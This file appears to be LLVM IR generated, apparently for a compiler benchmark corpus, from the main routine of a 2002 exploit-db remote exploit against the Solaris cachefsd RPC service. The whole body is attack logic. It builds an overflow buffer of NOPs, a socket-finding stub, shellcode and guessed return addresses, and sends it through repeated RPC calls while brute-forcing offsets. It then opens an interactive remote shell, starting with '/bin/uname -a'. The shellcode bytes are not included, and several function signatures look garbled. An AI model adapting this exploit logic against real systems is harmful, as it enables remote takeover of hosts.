; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/remote/extr_21437.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/remote/extr_21437.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i32, i32 }
%struct.TYPE_10__ = type { i32 }
%struct.hostent = type { i32* }
%struct.sockaddr_in = type { i32, %struct.TYPE_8__, i32 }
%struct.TYPE_8__ = type { i32 }
%struct.TYPE_9__ = type { i8*, i8* }
%struct.anon = type { i32, i32, i8* }
%struct.sockaddr = type { i32 }

@__const.main.tm = private unnamed_addr constant %struct.timeval { i32 10, i32 0, i32 0 }, align 4
@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM jan 2002 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [37 x i8] c"cachefsd for solaris 2.6 2.7 sparc\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [55 x i8] c"usage: %s address [-p port] [-o ofs] -v 6|7 [-b] [-m]\0A\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"p:o:v:bm\00", align 1
@optarg = common dso_local global i32 0, align 4
@tab = common dso_local global i32* null, align 8
@.str.4 = private unnamed_addr constant [41 x i8] c"ret=0x%08x adr=0x%08x ofs=%d timeout=%d\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@EADDRNOTAVAIL = common dso_local global i64 0, align 8
@errno = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [7 x i8] c"\0Aerror\00", align 1
@RPC_ANYSOCK = common dso_local global i32 0, align 4
@CACHEFS_PROG = common dso_local global i32 0, align 4
@CACHEFS_VERS = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [22 x i8] c"\0Aclnttcp_create error\00", align 1
@.str.7 = private unnamed_addr constant [10 x i8] c"localhost\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1
@CACHEFS_MOUNTED = common dso_local global i32 0, align 4
@xdr_req = common dso_local global i32 0, align 4
@xdr_void = common dso_local global i32 0, align 4
@RPC_SUCCESS = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [8 x i8] c"sockmod\00", align 1
@findsckcode = common dso_local global i8** null, align 8
@NOPNUM = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@shellcode = common dso_local global i8** null, align 8
@.str.10 = private unnamed_addr constant [8 x i8] c"/var/lp\00", align 1
@RPC_CANTRECV = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [2 x i8] c".\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [16 x i8] c"OK! adr=0x%08x\0A\00", align 1
@.str.13 = private unnamed_addr constant [15 x i8] c"/bin/uname -a\0A\00", align 1
@FD_SETSIZE = common dso_local global i32 0, align 4
@EWOULDBLOCK = common dso_local global i64 0, align 8
@EAGAIN = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [100000 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.TYPE_10__*, align 8
  %21 = alloca i32, align 4
  %22 = alloca %struct.hostent*, align 8
  %23 = alloca %struct.sockaddr_in, align 4
  %24 = alloca %struct.timeval, align 8
  %25 = alloca %struct.TYPE_9__, align 8
  %26 = alloca %struct.anon, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %13, align 4
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %17, align 4
  store i32 0, i32* %18, align 4
  store i32 -1, i32* %19, align 4
  %30 = bitcast %struct.timeval* %24 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %30, i8* align 4 bitcast (%struct.timeval* @__const.main.tm to i8*), i64 12, i1 false)
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0))
  %33 = load i32, i32* %4, align 4
  %34 = icmp slt i32 %33, 2
  br i1 %34, label %35, label %41

35:                                               ; preds = %2
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 0
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.2, i64 0, i64 0), i8* %38)
  %40 = call i32 @exit(i32 -1) #4
  unreachable

41:                                               ; preds = %2
  br label %42

42:                                               ; preds = %62, %41
  %43 = load i32, i32* %4, align 4
  %44 = sub nsw i32 %43, 1
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 1
  %47 = call i32 @getopt(i32 %44, i8** %46, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0))
  store i32 %47, i32* %10, align 4
  %48 = icmp ne i32 %47, -1
  br i1 %48, label %49, label %63

49:                                               ; preds = %42
  %50 = load i32, i32* %10, align 4
  switch i32 %50, label %62 [
    i32 112, label %51
    i32 111, label %54
    i32 118, label %57
    i32 98, label %60
    i32 109, label %61
  ]

51:                                               ; preds = %49
  %52 = load i32, i32* @optarg, align 4
  %53 = call i32 @atoi(i32 %52)
  store i32 %53, i32* %15, align 4
  br label %62

54:                                               ; preds = %49
  %55 = load i32, i32* @optarg, align 4
  %56 = call i32 @atoi(i32 %55)
  store i32 %56, i32* %13, align 4
  br label %62

57:                                               ; preds = %49
  %58 = load i32, i32* @optarg, align 4
  %59 = call i32 @atoi(i32 %58)
  store i32 %59, i32* %19, align 4
  br label %62

60:                                               ; preds = %49
  store i32 1, i32* %17, align 4
  br label %62

61:                                               ; preds = %49
  store i32 1, i32* %18, align 4
  br label %62

62:                                               ; preds = %61, %49, %60, %57, %54, %51
  br label %42

63:                                               ; preds = %42
  %64 = load i32, i32* %19, align 4
  switch i32 %64, label %67 [
    i32 6, label %65
    i32 7, label %66
    i32 8, label %66
  ]

65:                                               ; preds = %63
  store i32 -268440800, i32* %12, align 4
  br label %69

66:                                               ; preds = %63, %63
  store i32 -4265576, i32* %12, align 4
  br label %69

67:                                               ; preds = %63
  %68 = call i32 @exit(i32 -1) #4
  unreachable

69:                                               ; preds = %66, %65
  %70 = load i32, i32* %18, align 4
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %72, label %73

72:                                               ; preds = %69
  store i32 -268436964, i32* %12, align 4
  br label %73

73:                                               ; preds = %72, %69
  store i32 0, i32* %9, align 4
  br label %74

74:                                               ; preds = %337, %73
  %75 = load i32, i32* %9, align 4
  %76 = icmp slt i32 %75, 512
  br i1 %76, label %77, label %340

77:                                               ; preds = %74
  %78 = call i32 @htonl(i32 -2)
  %79 = load i32*, i32** @tab, align 8
  %80 = getelementptr inbounds i32, i32* %79, i64 1
  store i32 %78, i32* %80, align 4
  %81 = load i32*, i32** @tab, align 8
  %82 = getelementptr inbounds i32, i32* %81, i64 0
  store i32 %78, i32* %82, align 4
  %83 = load i32, i32* %12, align 4
  %84 = load i32, i32* %13, align 4
  %85 = add nsw i32 %83, %84
  %86 = load i32, i32* %14, align 4
  %87 = add nsw i32 %85, %86
  %88 = load i32, i32* %17, align 4
  %89 = icmp ne i32 %88, 0
  %90 = zext i1 %89 to i64
  %91 = select i1 %89, i32 80, i32 0
  %92 = add nsw i32 %87, %91
  %93 = call i32 @htonl(i32 %92)
  %94 = load i32*, i32** @tab, align 8
  %95 = getelementptr inbounds i32, i32* %94, i64 3
  store i32 %93, i32* %95, align 4
  %96 = load i32, i32* %12, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %96, %97
  %99 = load i32, i32* %14, align 4
  %100 = add nsw i32 %98, %99
  %101 = load i32, i32* %18, align 4
  %102 = icmp ne i32 %101, 0
  %103 = zext i1 %102 to i64
  %104 = select i1 %102, i32 -4136, i32 4228
  %105 = add nsw i32 %100, %104
  %106 = call i32 @htonl(i32 %105)
  %107 = load i32*, i32** @tab, align 8
  %108 = getelementptr inbounds i32, i32* %107, i64 9
  store i32 %106, i32* %108, align 4
  %109 = load i32, i32* %9, align 4
  %110 = icmp ne i32 %109, 0
  br i1 %110, label %124, label %111

111:                                              ; preds = %77
  %112 = load i32*, i32** @tab, align 8
  %113 = getelementptr inbounds i32, i32* %112, i64 9
  %114 = load i32, i32* %113, align 4
  %115 = call i32 @ntohl(i32 %114)
  %116 = load i32*, i32** @tab, align 8
  %117 = getelementptr inbounds i32, i32* %116, i64 3
  %118 = load i32, i32* %117, align 4
  %119 = call i32 @ntohl(i32 %118)
  %120 = load i32, i32* %13, align 4
  %121 = getelementptr inbounds %struct.timeval, %struct.timeval* %24, i32 0, i32 1
  %122 = load i32, i32* %121, align 4
  %123 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.4, i64 0, i64 0), i32 %115, i32 %119, i32 %120, i32 %122)
  br label %124

124:                                              ; preds = %111, %77
  %125 = load i32, i32* @AF_INET, align 4
  %126 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %23, i32 0, i32 2
  store i32 %125, i32* %126, align 4
  %127 = load i32, i32* %15, align 4
  %128 = call i32 @htons(i32 %127)
  %129 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %23, i32 0, i32 0
  store i32 %128, i32* %129, align 4
  %130 = load i8**, i8*** %5, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 1
  %132 = load i8*, i8** %131, align 8
  %133 = call i32 @inet_addr(i8* %132)
  %134 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %23, i32 0, i32 1
  %135 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %134, i32 0, i32 0
  store i32 %133, i32* %135, align 4
  %136 = icmp eq i32 %133, -1
  br i1 %136, label %137, label %155

137:                                              ; preds = %124
  %138 = load i8**, i8*** %5, align 8
  %139 = getelementptr inbounds i8*, i8** %138, i64 1
  %140 = load i8*, i8** %139, align 8
  %141 = call %struct.hostent* @gethostbyname(i8* %140)
  store %struct.hostent* %141, %struct.hostent** %22, align 8
  %142 = icmp eq %struct.hostent* %141, null
  br i1 %142, label %143, label %147

143:                                              ; preds = %137
  %144 = load i64, i64* @EADDRNOTAVAIL, align 8
  store i64 %144, i64* @errno, align 8
  %145 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  %146 = call i32 @exit(i32 -1) #4
  unreachable

147:                                              ; preds = %137
  %148 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %23, i32 0, i32 1
  %149 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %148, i32 0, i32 0
  %150 = bitcast i32* %149 to i8*
  %151 = load %struct.hostent*, %struct.hostent** %22, align 8
  %152 = getelementptr inbounds %struct.hostent, %struct.hostent* %151, i32 0, i32 0
  %153 = load i32*, i32** %152, align 8
  %154 = call i32 @memcpy(i8* %150, i32* %153, i32 4)
  br label %155

155:                                              ; preds = %147, %124
  %156 = load i32, i32* @RPC_ANYSOCK, align 4
  store i32 %156, i32* %16, align 4
  %157 = load i32, i32* @CACHEFS_PROG, align 4
  %158 = load i32, i32* @CACHEFS_VERS, align 4
  %159 = call %struct.TYPE_10__* @clnttcp_create(%struct.sockaddr_in* %23, i32 %157, i32 %158, i32* %16, i32 0, i32 0)
  store %struct.TYPE_10__* %159, %struct.TYPE_10__** %20, align 8
  %160 = icmp ne %struct.TYPE_10__* %159, null
  br i1 %160, label %164, label %161

161:                                              ; preds = %155
  %162 = call i32 @clnt_pcreateerror(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0))
  %163 = call i32 @exit(i32 -1) #4
  unreachable

164:                                              ; preds = %155
  %165 = call i32 @authunix_create(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0), i32 0, i32 0, i32 0, i32* null)
  %166 = load %struct.TYPE_10__*, %struct.TYPE_10__** %20, align 8
  %167 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %166, i32 0, i32 0
  store i32 %165, i32* %167, align 4
  %168 = getelementptr inbounds [100000 x i8], [100000 x i8]* %6, i64 0, i64 0
  %169 = call i32 @memset(i8* %168, i32 255, i32 60000)
  %170 = getelementptr inbounds [100000 x i8], [100000 x i8]* %6, i64 0, i64 60000
  store i8 0, i8* %170, align 16
  %171 = getelementptr inbounds [100000 x i8], [100000 x i8]* %6, i64 0, i64 0
  %172 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %25, i32 0, i32 0
  store i8* %171, i8** %172, align 8
  %173 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %25, i32 0, i32 1
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0), i8** %173, align 8
  %174 = load %struct.TYPE_10__*, %struct.TYPE_10__** %20, align 8
  %175 = load i32, i32* @CACHEFS_MOUNTED, align 4
  %176 = load i32, i32* @xdr_req, align 4
  %177 = bitcast %struct.TYPE_9__* %25 to i8*
  %178 = load i32, i32* @xdr_void, align 4
  %179 = call i32 @clnt_call(%struct.TYPE_10__* %174, i32 %175, i32 %176, i8* %177, i32 %178, i32* null, %struct.timeval* byval(%struct.timeval) align 8 %24)
  store i32 %179, i32* %21, align 4
  %180 = load i32, i32* %21, align 4
  %181 = load i32, i32* @RPC_SUCCESS, align 4
  %182 = icmp ne i32 %180, %181
  br i1 %182, label %183, label %187

183:                                              ; preds = %164
  %184 = load %struct.TYPE_10__*, %struct.TYPE_10__** %20, align 8
  %185 = call i32 @clnt_perror(%struct.TYPE_10__* %184, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  %186 = call i32 @exit(i32 -1) #4
  unreachable

187:                                              ; preds = %164
  store i32 12, i32* %8, align 4
  %188 = load i32, i32* %16, align 4
  %189 = bitcast %struct.sockaddr_in* %23 to %struct.sockaddr*
  %190 = call i32 @getsockname(i32 %188, %struct.sockaddr* %189, i32* %8)
  %191 = icmp eq i32 %190, -1
  br i1 %191, label %192, label %201

192:                                              ; preds = %187
  %193 = load i32, i32* %16, align 4
  %194 = call i32 (i32, i8, ...) @ioctl(i32 %193, i8 signext 2, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0))
  %195 = getelementptr inbounds %struct.anon, %struct.anon* %26, i32 0, i32 0
  store i32 65535, i32* %195, align 8
  %196 = getelementptr inbounds %struct.anon, %struct.anon* %26, i32 0, i32 1
  store i32 12, i32* %196, align 4
  %197 = bitcast %struct.sockaddr_in* %23 to i8*
  %198 = getelementptr inbounds %struct.anon, %struct.anon* %26, i32 0, i32 2
  store i8* %197, i8** %198, align 8
  %199 = load i32, i32* %16, align 4
  %200 = call i32 (i32, i8, ...) @ioctl(i32 %199, i8 signext -112, %struct.anon* %26)
  br label %201

201:                                              ; preds = %192, %187
  %202 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %23, i32 0, i32 0
  %203 = load i32, i32* %202, align 4
  %204 = call i32 @ntohs(i32 %203)
  store i32 %204, i32* %11, align 4
  %205 = load i32, i32* %11, align 4
  %206 = ashr i32 %205, 8
  %207 = and i32 %206, 255
  %208 = trunc i32 %207 to i8
  %209 = zext i8 %208 to i64
  %210 = inttoptr i64 %209 to i8*
  %211 = load i8**, i8*** @findsckcode, align 8
  %212 = getelementptr inbounds i8*, i8** %211, i64 14
  store i8* %210, i8** %212, align 8
  %213 = load i32, i32* %11, align 4
  %214 = and i32 %213, 255
  %215 = trunc i32 %214 to i8
  %216 = zext i8 %215 to i64
  %217 = inttoptr i64 %216 to i8*
  %218 = load i8**, i8*** @findsckcode, align 8
  %219 = getelementptr inbounds i8*, i8** %218, i64 15
  store i8* %217, i8** %219, align 8
  %220 = getelementptr inbounds [100000 x i8], [100000 x i8]* %6, i64 0, i64 0
  %221 = call i32 @memset(i8* %220, i32 65, i32 14000)
  %222 = getelementptr inbounds [100000 x i8], [100000 x i8]* %6, i64 0, i64 0
  store i8* %222, i8** %7, align 8
  store i32 0, i32* %8, align 4
  br label %223

223:                                              ; preds = %237, %201
  %224 = load i32, i32* %8, align 4
  %225 = load i32, i32* @NOPNUM, align 4
  %226 = icmp slt i32 %224, %225
  br i1 %226, label %227, label %240

227:                                              ; preds = %223
  %228 = load i32*, i32** @nop, align 8
  %229 = load i32, i32* %8, align 4
  %230 = srem i32 %229, 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds i32, i32* %228, i64 %231
  %233 = load i32, i32* %232, align 4
  %234 = trunc i32 %233 to i8
  %235 = load i8*, i8** %7, align 8
  %236 = getelementptr inbounds i8, i8* %235, i32 1
  store i8* %236, i8** %7, align 8
  store i8 %234, i8* %235, align 1
  br label %237

237:                                              ; preds = %227
  %238 = load i32, i32* %8, align 4
  %239 = add nsw i32 %238, 1
  store i32 %239, i32* %8, align 4
  br label %223

240:                                              ; preds = %223
  store i32 0, i32* %8, align 4
  br label %241

241:                                              ; preds = %255, %240
  %242 = load i32, i32* %8, align 4
  %243 = load i8**, i8*** @findsckcode, align 8
  %244 = call i32 @strlen(i8** %243)
  %245 = icmp slt i32 %242, %244
  br i1 %245, label %246, label %258

246:                                              ; preds = %241
  %247 = load i8**, i8*** @findsckcode, align 8
  %248 = load i32, i32* %8, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds i8*, i8** %247, i64 %249
  %251 = load i8*, i8** %250, align 8
  %252 = ptrtoint i8* %251 to i8
  %253 = load i8*, i8** %7, align 8
  %254 = getelementptr inbounds i8, i8* %253, i32 1
  store i8* %254, i8** %7, align 8
  store i8 %252, i8* %253, align 1
  br label %255

255:                                              ; preds = %246
  %256 = load i32, i32* %8, align 4
  %257 = add nsw i32 %256, 1
  store i32 %257, i32* %8, align 4
  br label %241

258:                                              ; preds = %241
  store i32 0, i32* %8, align 4
  br label %259

259:                                              ; preds = %273, %258
  %260 = load i32, i32* %8, align 4
  %261 = load i8**, i8*** @shellcode, align 8
  %262 = call i32 @strlen(i8** %261)
  %263 = icmp slt i32 %260, %262
  br i1 %263, label %264, label %276

264:                                              ; preds = %259
  %265 = load i8**, i8*** @shellcode, align 8
  %266 = load i32, i32* %8, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds i8*, i8** %265, i64 %267
  %269 = load i8*, i8** %268, align 8
  %270 = ptrtoint i8* %269 to i8
  %271 = load i8*, i8** %7, align 8
  %272 = getelementptr inbounds i8, i8* %271, i32 1
  store i8* %272, i8** %7, align 8
  store i8 %270, i8* %271, align 1
  br label %273

273:                                              ; preds = %264
  %274 = load i32, i32* %8, align 4
  %275 = add nsw i32 %274, 1
  store i32 %275, i32* %8, align 4
  br label %259

276:                                              ; preds = %259
  %277 = getelementptr inbounds [100000 x i8], [100000 x i8]* %6, i64 0, i64 13920
  %278 = load i32*, i32** @tab, align 8
  %279 = call i32 @memcpy(i8* %277, i32* %278, i32 40)
  %280 = getelementptr inbounds [100000 x i8], [100000 x i8]* %6, i64 0, i64 14000
  store i8 0, i8* %280, align 16
  %281 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %25, i32 0, i32 0
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0), i8** %281, align 8
  %282 = getelementptr inbounds [100000 x i8], [100000 x i8]* %6, i64 0, i64 0
  %283 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %25, i32 0, i32 1
  store i8* %282, i8** %283, align 8
  %284 = load %struct.TYPE_10__*, %struct.TYPE_10__** %20, align 8
  %285 = load i32, i32* @CACHEFS_MOUNTED, align 4
  %286 = load i32, i32* @xdr_req, align 4
  %287 = bitcast %struct.TYPE_9__* %25 to i8*
  %288 = load i32, i32* @xdr_void, align 4
  %289 = call i32 @clnt_call(%struct.TYPE_10__* %284, i32 %285, i32 %286, i8* %287, i32 %288, i32* null, %struct.timeval* byval(%struct.timeval) align 8 %24)
  store i32 %289, i32* %21, align 4
  %290 = load i32, i32* %21, align 4
  %291 = load i32, i32* @RPC_SUCCESS, align 4
  %292 = icmp ne i32 %290, %291
  br i1 %292, label %293, label %297

293:                                              ; preds = %276
  %294 = load %struct.TYPE_10__*, %struct.TYPE_10__** %20, align 8
  %295 = call i32 @clnt_perror(%struct.TYPE_10__* %294, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  %296 = call i32 @exit(i32 -1) #4
  unreachable

297:                                              ; preds = %276
  %298 = load %struct.TYPE_10__*, %struct.TYPE_10__** %20, align 8
  %299 = load i32, i32* @CACHEFS_MOUNTED, align 4
  %300 = load i32, i32* @xdr_req, align 4
  %301 = bitcast %struct.TYPE_9__* %25 to i8*
  %302 = load i32, i32* @xdr_void, align 4
  %303 = call i32 @clnt_call(%struct.TYPE_10__* %298, i32 %299, i32 %300, i8* %301, i32 %302, i32* null, %struct.timeval* byval(%struct.timeval) align 8 %24)
  store i32 %303, i32* %21, align 4
  %304 = load i32, i32* %21, align 4
  %305 = load i32, i32* @RPC_SUCCESS, align 4
  %306 = icmp eq i32 %304, %305
  br i1 %306, label %311, label %307

307:                                              ; preds = %297
  %308 = load i32, i32* %21, align 4
  %309 = load i32, i32* @RPC_CANTRECV, align 4
  %310 = icmp eq i32 %308, %309
  br i1 %310, label %311, label %335

311:                                              ; preds = %307, %297
  %312 = load %struct.TYPE_10__*, %struct.TYPE_10__** %20, align 8
  %313 = call i32 @clnt_destroy(%struct.TYPE_10__* %312)
  %314 = load i32, i32* %16, align 4
  %315 = call i32 @close(i32 %314)
  %316 = load i32, i32* %9, align 4
  %317 = srem i32 %316, 2
  %318 = icmp ne i32 %317, 0
  br i1 %318, label %319, label %325

319:                                              ; preds = %311
  %320 = load i32, i32* %9, align 4
  %321 = ashr i32 %320, 1
  %322 = add nsw i32 %321, 1
  %323 = sub nsw i32 0, %322
  %324 = mul nsw i32 %323, 4
  br label %330

325:                                              ; preds = %311
  %326 = load i32, i32* %9, align 4
  %327 = ashr i32 %326, 1
  %328 = add nsw i32 %327, 1
  %329 = mul nsw i32 %328, 4
  br label %330

330:                                              ; preds = %325, %319
  %331 = phi i32 [ %324, %319 ], [ %329, %325 ]
  store i32 %331, i32* %14, align 4
  %332 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11, i64 0, i64 0))
  %333 = load i32, i32* @stdout, align 4
  %334 = call i32 @fflush(i32 %333)
  br label %336

335:                                              ; preds = %307
  br label %340

336:                                              ; preds = %330
  br label %337

337:                                              ; preds = %336
  %338 = load i32, i32* %9, align 4
  %339 = add nsw i32 %338, 1
  store i32 %339, i32* %9, align 4
  br label %74

340:                                              ; preds = %335, %74
  %341 = load i32*, i32** @tab, align 8
  %342 = getelementptr inbounds i32, i32* %341, i64 3
  %343 = load i32, i32* %342, align 4
  %344 = call i32 @ntohl(i32 %343)
  %345 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.12, i64 0, i64 0), i32 %344)
  %346 = load i32, i32* %16, align 4
  %347 = call i32 @write(i32 %346, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i64 0, i64 0), i32 14)
  br label %348

348:                                              ; preds = %340, %371, %395, %402
  %349 = call i32 @FD_ZERO(i32* %27)
  %350 = call i32 @FD_SET(i32 0, i32* %27)
  %351 = load i32, i32* %16, align 4
  %352 = call i32 @FD_SET(i32 %351, i32* %27)
  %353 = load i32, i32* @FD_SETSIZE, align 4
  %354 = call i64 @select(i32 %353, i32* %27, i32* null, i32* null, i32* null)
  %355 = icmp ne i64 %354, 0
  br i1 %355, label %356, label %402

356:                                              ; preds = %348
  %357 = call i64 @FD_ISSET(i32 0, i32* %27)
  %358 = icmp ne i64 %357, 0
  br i1 %358, label %359, label %378

359:                                              ; preds = %356
  %360 = getelementptr inbounds [1024 x i8], [1024 x i8]* %29, i64 0, i64 0
  %361 = call i32 @read(i32 0, i8* %360, i32 1024)
  store i32 %361, i32* %28, align 4
  %362 = icmp slt i32 %361, 1
  br i1 %362, label %363, label %373

363:                                              ; preds = %359
  %364 = load i64, i64* @errno, align 8
  %365 = load i64, i64* @EWOULDBLOCK, align 8
  %366 = icmp eq i64 %364, %365
  br i1 %366, label %371, label %367

367:                                              ; preds = %363
  %368 = load i64, i64* @errno, align 8
  %369 = load i64, i64* @EAGAIN, align 8
  %370 = icmp eq i64 %368, %369
  br i1 %370, label %371, label %372

371:                                              ; preds = %367, %363
  br label %348

372:                                              ; preds = %367
  br label %403

373:                                              ; preds = %359
  %374 = load i32, i32* %16, align 4
  %375 = getelementptr inbounds [1024 x i8], [1024 x i8]* %29, i64 0, i64 0
  %376 = load i32, i32* %28, align 4
  %377 = call i32 @write(i32 %374, i8* %375, i32 %376)
  br label %378

378:                                              ; preds = %373, %356
  %379 = load i32, i32* %16, align 4
  %380 = call i64 @FD_ISSET(i32 %379, i32* %27)
  %381 = icmp ne i64 %380, 0
  br i1 %381, label %382, label %401

382:                                              ; preds = %378
  %383 = load i32, i32* %16, align 4
  %384 = getelementptr inbounds [1024 x i8], [1024 x i8]* %29, i64 0, i64 0
  %385 = call i32 @read(i32 %383, i8* %384, i32 1024)
  store i32 %385, i32* %28, align 4
  %386 = icmp slt i32 %385, 1
  br i1 %386, label %387, label %397

387:                                              ; preds = %382
  %388 = load i64, i64* @errno, align 8
  %389 = load i64, i64* @EWOULDBLOCK, align 8
  %390 = icmp eq i64 %388, %389
  br i1 %390, label %395, label %391

391:                                              ; preds = %387
  %392 = load i64, i64* @errno, align 8
  %393 = load i64, i64* @EAGAIN, align 8
  %394 = icmp eq i64 %392, %393
  br i1 %394, label %395, label %396

395:                                              ; preds = %391, %387
  br label %348

396:                                              ; preds = %391
  br label %403

397:                                              ; preds = %382
  %398 = getelementptr inbounds [1024 x i8], [1024 x i8]* %29, i64 0, i64 0
  %399 = load i32, i32* %28, align 4
  %400 = call i32 @write(i32 1, i8* %398, i32 %399)
  br label %401

401:                                              ; preds = %397, %378
  br label %402

402:                                              ; preds = %401, %348
  br label %348

403:                                              ; preds = %396, %372
  %404 = load i32, i32* %3, align 4
  ret i32 %404
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @getopt(i32, i8**, i8*) #2

declare dso_local i32 @atoi(i32) #2

declare dso_local i32 @htonl(i32) #2

declare dso_local i32 @ntohl(i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @memcpy(i8*, i32*, i32) #2

declare dso_local %struct.TYPE_10__* @clnttcp_create(%struct.sockaddr_in*, i32, i32, i32*, i32, i32) #2

declare dso_local i32 @clnt_pcreateerror(i8*) #2

declare dso_local i32 @authunix_create(i8*, i32, i32, i32, i32*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @clnt_call(%struct.TYPE_10__*, i32, i32, i8*, i32, i32*, %struct.timeval* byval(%struct.timeval) align 8) #2

declare dso_local i32 @clnt_perror(%struct.TYPE_10__*, i8*) #2

declare dso_local i32 @getsockname(i32, %struct.sockaddr*, i32*) #2

declare dso_local i32 @ioctl(i32, i8 signext, ...) #2

declare dso_local i32 @ntohs(i32) #2

declare dso_local i32 @strlen(i8**) #2

declare dso_local i32 @clnt_destroy(%struct.TYPE_10__*) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @FD_ZERO(i32*) #2

declare dso_local i32 @FD_SET(i32, i32*) #2

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #2

declare dso_local i64 @FD_ISSET(i32, i32*) #2

declare dso_local i32 @read(i32, i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
